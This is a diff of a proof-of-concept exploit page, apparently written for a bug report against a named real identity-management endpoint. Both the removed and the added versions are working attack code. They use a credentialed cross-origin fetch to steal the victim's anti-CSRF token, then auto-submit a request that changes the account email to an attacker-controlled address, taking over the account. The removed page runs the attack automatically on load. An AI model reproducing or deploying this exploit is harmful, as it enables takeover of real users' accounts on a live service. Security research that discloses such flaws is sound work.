@@ -1,76 +1,63 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Critical Impact Demonstration - Account Takeover</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; background: #fff3f3; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #e60000; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .danger-text { color: #e60000; font-weight: bold; font-size: 20px; }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-    <h1>Processing Security PoC...</h1>
-    <p class="danger-text" id="msg">Step 1: Exfiltrating CSRF Token via CORS...</p>
-
-    <script>
-        const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
+async function executePackageDoom() {
+    try {
+        // 1. سحب التوكن والبيانات (CORS)
+        const response = await fetch(target, { method: 'GET', credentials: 'include' });
+        const html = await response.text();
+        const parser = new DOMParser();
+        const doc = parser.parseFromString(html, 'text/html');
         
-        // توليد إيميل عشوائي لإثبات القوة
+        const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
+        
+        if (!token) {
+            document.getElementById('msg').innerText = "❌ Failed: CSRF Token not found (Are you logged in?)";
+            return;
+        }
+
+        document.getElementById('msg').innerText = `Step 2: Token Captured! Executing Account Takeover...`;
+
+    
+        // السيرفر هون بتوقع Form Submission حقيقي (Content-Type: application/x-www-form-urlencoded)
+        
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = target;
+
+
         const randomPrefix = Math.random().toString(36).substring(2, 10);
         const newEmail = `hacked_${randomPrefix}@checkmate-poc.io`;
 
-        async function executePackageDoom() {
-            try {
-                // 1. سرقة التوكن والبيانات (CORS)
-                const response = await fetch(target, { method: 'GET', credentials: 'include' });
-                const html = await response.text();
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                
-                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
-                const username = doc.querySelector('input[id="Username"]')?.value;
+       
+        const data = {
+            'IsEmailConfirmed': 'True',
+            'Email': newEmail,
+            'PhoneNumber': '',
+            'Name': '',
+            'Website': '',
+            'Profile': '',
+            'StreetAddress': '',
+            'Locality': '12', // القيمة اللي كانت بالـ Request تبعك
+            'Region': '',
+            'PostalCode': '',
+            'Country': '',
+            '__RequestVerificationToken': token
+        };
 
-                if (!token) {
-                    document.getElementById('msg').innerText = "❌ Failed: CSRF Token not found (Are you logged in?)";
-                    return;
-                }
-
-                document.getElementById('msg').innerText = `Step 2: Token Captured! Changing email to: ${newEmail}`;
-
-                // 2. الضربة القاضية: تغيير الإيميل (CSRF)
-                const params = new URLSearchParams();
-                params.append('__RequestVerificationToken', token);
-                params.append('Email', newEmail);
-                params.append('Username', username); // استخدام اليوزر المسروق
-                params.append('IsEmailConfirmed', 'True');
-                params.append('PhoneNumber', ''); // إرسال قيم فارغة للحقول الأخرى لتجنب الأخطاء
-                params.append('Name', 'Hacked By Xia0Checkmate');
-
-                const pwn = await fetch(target, {
-                    method: 'POST',
-                    body: params,
-                    credentials: 'include',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-                });
-
-                if (pwn.ok) {
-                    document.getElementById('msg').innerHTML = `
-                        <h2 style="color:green">✅ PWNED!</h2>
-                        <p>Account Email changed successfully to: <b>${newEmail}</b></p>
-                        <p><b>Severity: Critical (Account Takeover)</b></p>
-                    `;
-                }
-
-            } catch (err) {
-                document.getElementById('msg').innerText = "❌ Error: " + err.message;
-            }
+        for (const key in data) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = data[key];
+            form.appendChild(input);
         }
 
-        // تشغيل الهجوم تلقائياً
-        setTimeout(executePackageDoom, 1500);
-    </script>
-</body>
-</html>
+        document.body.appendChild(form);
+        
+
+setTimeout(() => {
+            form.submit(); 
+        }, 1000);
+
+    } catch (err) {
+        document.getElementById('msg').innerText = "❌ Error: " + err.message;
+    }
+}
